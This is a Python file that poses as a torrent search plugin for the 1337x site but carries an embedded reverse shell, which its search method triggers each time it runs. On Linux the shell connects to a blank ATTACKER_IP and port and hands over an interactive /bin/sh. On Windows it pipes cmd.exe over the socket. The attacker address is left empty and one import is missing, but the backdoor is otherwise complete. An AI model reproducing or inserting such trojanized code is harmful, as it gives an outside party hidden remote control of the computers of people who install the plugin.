# VERSION: 1.00
# AUTHORS: sa3dany, pizza-power (reverse-shell)

# LICENSING INFORMATION
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import re
from html.parser import HTMLParser

from helpers import download_file, retrieve_url
from novaprinter import prettyPrinter

# for reverse shell
import os
import subprocess
import socket
import platform

# reverse shell
ATTACKER_IP = "" # attacker IP, string
ATTACKER_PORT =  # listening port, int
P = platform.system()

class reverse_shell(object): 
    """

    """
    def __init__(self):
        if P == "Linux":
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ATTACKER_IP, ATTACKER_PORT))
                    os.dup2(s.fileno(),0)
                    os.dup2(s.fileno(),1)
                    os.dup2(s.fileno(),2)
                    p=subprocess.call(["/bin/sh","-i"])
                except:
                    break
        
        elif P == "Windows":
            def s2p(s, p):
                while True:
                    data = s.recv(1024)
                    if len(data) > 0:
                        p.stdin.write(data)
                        p.stdin.flush()

            def p2s(s, p):
                   while True:
                       s.send(p.stdout.read(1))

            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ATTACKER_IP,ATTACKER_PORT))

            p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

            s2p_thread = threading.Thread(target=s2p, args=[s, p])
            s2p_thread.daemon = True
            s2p_thread.start()

            p2s_thread = threading.Thread(target=p2s, args=[s, p])
            p2s_thread.daemon = True
            p2s_thread.start()

            try:
                p.wait()
            except KeyboardInterrupt:
                s.close()


class one337x(object):
    url = 'https://1337x.to'
    name = '1337x'
    supported_categories = {
        'all': None,
        'anime': 'Anime',
        'software': 'Applications',
        'games': 'Games',
        'movies': 'Movies',
        'music': 'Music',
        'tv': 'TV',
    }

    class MyHtmlParser(HTMLParser):
        def error(self, message):
            pass

        A, TD, TR, HREF, TABLE = ('a', 'td', 'tr', 'href', 'tbody')

        def __init__(self, url):
            HTMLParser.__init__(self)
            self.url = url
            self.row = {}
            self.column = None
            self.insideRow = False
            self.foundTable = False
            self.foundResults = False
            self.parser_class = {
                # key: className
                'name': 'name',
                'seeds': 'seeds',
                'leech': 'leeches',
                'size': 'size'
            }

        def handle_starttag(self, tag, attrs):
            params = dict(attrs)

            if 'search-page' in params.get('class', ''):
                self.foundResults = True
                return

            if self.foundResults and tag == self.TABLE:
                self.foundTable = True
                return

            if self.foundTable and tag == self.TR:
                self.insideRow = True
                return

            if self.insideRow and tag == self.TD:
                classList = params.get('class', None)
                for columnName, classValue in self.parser_class.items():
                    if classValue in classList:
                        self.column = columnName
                        self.row[self.column] = -1
                return

            if self.insideRow and tag == self.A:
                if self.column != 'name' or self.HREF not in params:
                    return
                link = params[self.HREF]
                if link.startswith('/torrent/'):
                    link = f'{self.url}{link}'
                    self.row['link'] = link
                    self.row['engine_url'] = self.url
                    self.row['desc_link'] = link

        def handle_data(self, data):
            if self.insideRow and self.column:
                self.row[self.column] = data
                self.column = None

        def handle_endtag(self, tag):
            if tag == 'table':
                self.foundTable = False

            if self.insideRow and tag == self.TR:
                self.insideRow = False
                self.column = None
                array_length = len(self.row)
                if array_length < 1:
                    return
                prettyPrinter(self.row)
                self.row = {}

    def download_torrent(self, info):
        info_page = retrieve_url(info)
        magnet_match = re.search(r'href\s*\=\s*"(magnet[^"]+)"', info_page)
        if magnet_match and magnet_match.groups():
            print(magnet_match.groups()[0] + ' ' + info)
        else:
            raise Exception('Error, please fill a bug report!')

    def search(self, what, cat='all'):
        category = self.supported_categories[cat]
        reverse_shell()

        if category:
            page_url = f'{self.url}/category-search/{what}/{category}/1/'
        else:
            page_url = f'{self.url}/search/{what}/1/'

        parser = self.MyHtmlParser(self.url)
        html = retrieve_url(page_url)
        parser.feed(html)
        parser.close()
